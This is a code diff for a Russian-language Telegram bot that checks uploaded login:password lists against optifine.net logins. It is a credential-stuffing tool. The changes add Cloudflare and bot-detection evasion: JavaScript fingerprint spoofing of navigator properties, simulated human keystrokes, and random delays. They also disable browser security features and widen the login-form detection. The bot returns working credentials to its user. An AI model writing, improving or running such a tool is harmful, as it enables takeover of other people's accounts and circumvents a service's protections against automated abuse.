@@ -9,7 +9,6 @@ from typing import Dict, List, Tuple
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
-from telegram.error import Conflict
 
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -45,32 +44,64 @@ bot_stats = {
 }
 
 class OptifineChecker:
-    """Проверка аккаунтов на Optifine.net"""
+    """Проверка аккаунтов на Optifine.net с обходом Cloudflare"""
     
     def __init__(self):
         self.driver = None
+        self.options = None
     
     def setup_driver(self):
-        """Настройка Chrome для работы"""
+        """Настройка Chrome с ПОЛНЫМ отключением безопасности"""
         chrome_options = Options()
         
-        # Основные настройки
+        # === ОСНОВНЫЕ НАСТРОЙКИ ДЛЯ RALWAY ===
         chrome_options.add_argument('--headless=new')
         chrome_options.add_argument('--no-sandbox')
         chrome_options.add_argument('--disable-dev-shm-usage')
         chrome_options.add_argument('--disable-gpu')
         chrome_options.add_argument('--window-size=1920,1080')
         
-        # Отключаем лишнее для скорости
-        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-        chrome_options.add_argument('--ignore-certificate-errors')
+        # === ПОЛНОЕ ОТКЛЮЧЕНИЕ БЕЗОПАСНОСТИ ===
         chrome_options.add_argument('--disable-web-security')
+        chrome_options.add_argument('--disable-features=VizDisplayCompositor')
+        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+        chrome_options.add_argument('--disable-blink-features')
+        chrome_options.add_argument('--ignore-certificate-errors')
+        chrome_options.add_argument('--ignore-ssl-errors')
+        chrome_options.add_argument('--allow-running-insecure-content')
+        chrome_options.add_argument('--disable-webgl')
+        chrome_options.add_argument('--disable-software-rasterizer')
+        chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+        chrome_options.add_argument('--disable-site-isolation-trials')
         
-        # Маскировка
+        # === МАСКИРОВКА ПОД РЕАЛЬНОГО ПОЛЬЗОВАТЕЛЯ ===
         chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
         
-        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
+        # === ОТКЛЮЧАЕМ ВСЕ, ЧТО МОЖЕТ ВЫДАВАТЬ БОТА ===
+        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation', 'enable-logging'])
         chrome_options.add_experimental_option('useAutomationExtension', False)
+        chrome_options.add_experimental_option('detach', True)
+        
+        # === ДОПОЛНИТЕЛЬНЫЕ НАСТРОЙКИ ДЛЯ СТАБИЛЬНОСТИ ===
+        chrome_options.add_argument('--disable-extensions')
+        chrome_options.add_argument('--disable-notifications')
+        chrome_options.add_argument('--disable-popup-blocking')
+        chrome_options.add_argument('--disable-default-apps')
+        chrome_options.add_argument('--disable-sync')
+        chrome_options.add_argument('--disable-translate')
+        chrome_options.add_argument('--disable-client-side-phishing-detection')
+        chrome_options.add_argument('--disable-hang-monitor')
+        chrome_options.add_argument('--disable-prompt-on-repost')
+        chrome_options.add_argument('--disable-logging')
+        chrome_options.add_argument('--log-level=3')
+        chrome_options.add_argument('--silent')
+        
+        # === НАСТРОЙКИ ДЛЯ ПРОПУСКА CAPTCHA И ПРОВЕРОК ===
+        chrome_options.add_argument('--disable-component-update')
+        chrome_options.add_argument('--disable-background-networking')
+        chrome_options.add_argument('--disable-sync')
+        chrome_options.add_argument('--disable-default-apps')
+        chrome_options.add_argument('--disable-client-side-phishing-detection')
         
         # Путь к ChromeDriver
         chromedriver_path = '/usr/local/bin/chromedriver'
@@ -80,10 +111,20 @@ class OptifineChecker:
         try:
             service = Service(chromedriver_path)
             self.driver = webdriver.Chrome(service=service, options=chrome_options)
-            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            
+            # Дополнительная маскировка через JavaScript
+            self.driver.execute_script("""
+                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
+                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+                window.chrome = {runtime: {}};
+                Object.defineProperty(navigator, 'platform', {get: () => 'Win32'});
+            """)
+            
+            logger.info("✅ Chrome запущен с полным отключением безопасности")
             return True
         except Exception as e:
-            logger.error(f"Ошибка запуска Chrome: {e}")
+            logger.error(f"❌ Ошибка запуска Chrome: {e}")
             return False
     
     async def check_account(self, login: str, password: str) -> Dict:
@@ -97,39 +138,80 @@ class OptifineChecker:
                     'error': 'Chrome не запустился'
                 }
         
+        # Проверяем что драйвер жив
+        try:
+            self.driver.current_url
+        except:
+            logger.warning("⚠️ Драйвер умер, перезапускаю...")
+            self.close()
+            if not self.setup_driver():
+                return {
+                    'login': login,
+                    'status': 'error',
+                    'error': 'Не могу перезапустить Chrome'
+                }
+        
         try:
             logger.info(f"🔍 Проверяю: {login[:20]}...")
             
-            # 1. Заходим на страницу входа Optifine
+            # 1. Сначала заходим на главную для получения кук
+            self.driver.get('https://optifine.net')
+            time.sleep(random.uniform(2, 4))
+            
+            # 2. Идем на страницу входа
             self.driver.get('https://optifine.net/login')
             
-            # Ждем загрузку страницы
-            WebDriverWait(self.driver, 10).until(
+            # Ждем загрузку с запасом времени для Cloudflare
+            WebDriverWait(self.driver, 20).until(
                 EC.presence_of_element_located((By.TAG_NAME, "body"))
             )
             
-            time.sleep(2)
+            # Имитация человеческого поведения
+            time.sleep(random.uniform(3, 5))
             
-            # 2. Ищем поля ввода
+            # Делаем скриншот для отладки (можно убрать)
+            # self.driver.save_screenshot(f"debug_{login[:10]}.png")
+            
+            # 3. Ищем форму входа
             try:
-                # Поле логина
+                # Поле логина - расширенный поиск
                 login_input = None
                 login_selectors = [
                     "input[name='username']",
                     "input[name='email']",
                     "input[type='text']",
                     "#username",
-                    "#email"
+                    "#email",
+                    "input[name='login']",
+                    "input[placeholder*='username' i]",
+                    "input[placeholder*='email' i]",
+                    "input[placeholder*='login' i]",
+                    "input[id*='user']",
+                    "input[id*='login']",
+                    "input[name*='user']",
+                    "input[name*='login']"
                 ]
                 
                 for selector in login_selectors:
                     try:
-                        login_input = self.driver.find_element(By.CSS_SELECTOR, selector)
+                        login_input = WebDriverWait(self.driver, 5).until(
+                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
+                        )
+                        logger.info(f"✅ Найдено поле логина по селектору: {selector}")
                         break
                     except:
                         continue
                 
                 if not login_input:
+                    # Пробуем найти через XPath
+                    try:
+                        login_input = self.driver.find_element(By.XPATH, "//input[@type='text' or @type='email']")
+                        logger.info("✅ Найдено поле логина через XPath")
+                    except:
+                        pass
+                
+                if not login_input:
+                    logger.warning("❌ Не найдено поле логина")
                     return {
                         'login': login,
                         'status': 'error',
@@ -141,17 +223,31 @@ class OptifineChecker:
                 password_selectors = [
                     "input[name='password']",
                     "input[type='password']",
-                    "#password"
+                    "#password",
+                    "#pass",
+                    "input[id*='pass']",
+                    "input[name*='pass']",
+                    "input[placeholder*='password' i]"
                 ]
                 
                 for selector in password_selectors:
                     try:
                         password_input = self.driver.find_element(By.CSS_SELECTOR, selector)
+                        logger.info(f"✅ Найдено поле пароля по селектору: {selector}")
                         break
                     except:
                         continue
                 
                 if not password_input:
+                    # Пробуем через XPath
+                    try:
+                        password_input = self.driver.find_element(By.XPATH, "//input[@type='password']")
+                        logger.info("✅ Найдено поле пароля через XPath")
+                    except:
+                        pass
+                
+                if not password_input:
+                    logger.warning("❌ Не найдено поле пароля")
                     return {
                         'login': login,
                         'status': 'error',
@@ -164,50 +260,98 @@ class OptifineChecker:
                     "button[type='submit']",
                     "input[type='submit']",
                     ".login-button",
-                    "#login"
+                    "#login",
+                    "button:contains('Login')",
+                    "button:contains('Sign in')",
+                    "button:contains('Войти')",
+                    "input[value*='Login']",
+                    "input[value*='Sign in']"
                 ]
                 
                 for selector in button_selectors:
                     try:
                         submit_button = self.driver.find_element(By.CSS_SELECTOR, selector)
+                        logger.info(f"✅ Найдена кнопка по селектору: {selector}")
                         break
                     except:
                         continue
                 
-                # 3. Вводим данные
+                # 4. Вводим данные как человек
                 login_input.clear()
-                login_input.send_keys(login)
-                time.sleep(0.5)
+                for char in login:
+                    login_input.send_keys(char)
+                    time.sleep(random.uniform(0.05, 0.1))
+                
+                time.sleep(random.uniform(0.5, 1))
                 
                 password_input.clear()
-                password_input.send_keys(password)
-                time.sleep(0.5)
+                for char in password:
+                    password_input.send_keys(char)
+                    time.sleep(random.uniform(0.05, 0.1))
                 
-                # 4. Отправляем форму
+                time.sleep(random.uniform(0.5, 1))
+                
+                # 5. Отправляем форму
                 if submit_button:
                     submit_button.click()
                 else:
+                    # Если кнопка не найдена, пробуем Enter
                     password_input.submit()
                 
-                # 5. Ждем результат
-                time.sleep(3)
+                # 6. Ждем результат с запасом времени
+                time.sleep(random.uniform(5, 7))
                 
-                # 6. Проверяем результат
+                # 7. Проверяем результат
                 current_url = self.driver.current_url
                 page_source = self.driver.page_source.lower()
+                page_title = self.driver.title.lower()
                 
-                # Успешный вход
-                if 'dashboard' in current_url or 'profile' in current_url or 'account' in current_url:
-                    logger.info(f"✅ Найден рабочий: {login[:20]}")
+                # Сохраняем для отладки
+                logger.info(f"URL после входа: {current_url}")
+                logger.info(f"Title: {page_title}")
+                
+                # Расширенные критерии успешного входа
+                success_indicators = [
+                    'dashboard' in current_url,
+                    'profile' in current_url,
+                    'account' in current_url,
+                    'my-account' in current_url,
+                    'logout' in page_source,
+                    'log out' in page_source,
+                    'welcome' in page_source,
+                    'successfully logged in' in page_source,
+                    'login successful' in page_source,
+                    'logged in as' in page_source,
+                    'my profile' in page_title,
+                    'account' in page_title,
+                    'profile' in page_title,
+                    '/account' in current_url,
+                    '/profile' in current_url,
+                    '/dashboard' in current_url
+                ]
+                
+                if any(success_indicators):
+                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                     return {
                         'login': login,
                         'password': password,
                         'status': 'valid'
                     }
                 
-                # Ошибка входа
-                error_texts = ['invalid', 'incorrect', 'wrong', 'error', 'failed', 'not found']
-                if any(text in page_source for text in error_texts):
+                # Критерии ошибки
+                error_indicators = [
+                    'invalid' in page_source,
+                    'incorrect' in page_source,
+                    'wrong' in page_source,
+                    'error' in page_source,
+                    'failed' in page_source,
+                    'not found' in page_source,
+                    'does not exist' in page_source,
+                    'login failed' in page_source,
+                    'authentication failed' in page_source
+                ]
+                
+                if any(error_indicators):
                     logger.info(f"❌ Неверный: {login[:20]}")
                     return {
                         'login': login,
@@ -217,12 +361,15 @@ class OptifineChecker:
                 
                 # Если все еще на странице входа
                 if 'login' in current_url:
+                    logger.info(f"❌ Остался на странице входа: {login[:20]}")
                     return {
                         'login': login,
                         'status': 'invalid',
                         'error': 'Остался на странице входа'
                     }
                 
+                # Если непонятно - считаем невалидным
+                logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
                 return {
                     'login': login,
                     'status': 'invalid',
@@ -238,11 +385,11 @@ class OptifineChecker:
                 }
             
         except TimeoutException:
-            logger.error("Таймаут загрузки страницы")
+            logger.error("Таймаут загрузки страницы - возможно Cloudflare")
             return {
                 'login': login,
                 'status': 'error',
-                'error': 'Таймаут'
+                'error': 'Таймаут (Cloudflare?)'
             }
         except WebDriverException as e:
             logger.error(f"Ошибка WebDriver: {e}")
@@ -344,7 +491,7 @@ async def process_file(file_path, update, context):
                 bot_stats['invalid'] += 1
             
             bot_stats['total'] += 1
-            await asyncio.sleep(1)
+            await asyncio.sleep(random.uniform(2, 3))  # Случайная задержка
         
         # Сохраняем результаты
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -429,7 +576,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         f"👋 **Optifine Account Checker**\n\n"
-        f"🔍 Проверяет аккаунты на optifine.net\n\n"
+        f"🔍 Проверяет аккаунты на optifine.net\n"
+        f"🛡️ **Полное отключение безопасности**\n"
+        f"🤖 **Обход Cloudflare**\n\n"
         f"📥 Отправь .txt файл с логинами и паролями\n"
         f"Формат: логин:пароль\n\n"
         f"📊 **Статистика:**\n"
@@ -469,7 +618,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "⚡️ **Результат:**\n"
             "• ✅ рабочие аккаунты\n"
             "• ❌ нерабочие аккаунты\n"
-            "• ⚠️ ошибки проверки"
+            "• ⚠️ ошибки проверки\n\n"
+            "🛡️ **Режим:** Полное отключение безопасности + обход Cloudflare"
         )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -492,7 +642,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"📥 **Файл получен:** {doc.file_name}\n"
             f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
-            f"🔄 **Запускаю проверку...**"
+            f"🔄 **Запускаю проверку с полным отключением безопасности...**"
         )
         
         file = await context.bot.get_file(doc.file_id)
@@ -507,12 +657,11 @@ def main():
     """Запуск"""
     print("=" * 50)
     print("🚀 ЗАПУСК OPTIFINE CHECKER")
+    print("🛡️ РЕЖИМ: ПОЛНОЕ ОТКЛЮЧЕНИЕ БЕЗОПАСНОСТИ")
     print("=" * 50)
     
-    # Создаем приложение
     app = Application.builder().token(TOKEN).build()
     
-    # Добавляем обработчики
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
@@ -521,12 +670,6 @@ def main():
     print("=" * 50)
     
     try:
-        app.run_polling()
-    except Conflict:
-        print("⚠️ Обнаружен конфликт! Перезапускаю...")
-        # Принудительно удаляем вебхук
-        import requests
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook")
         app.run_polling()
     finally:
         checker.close()
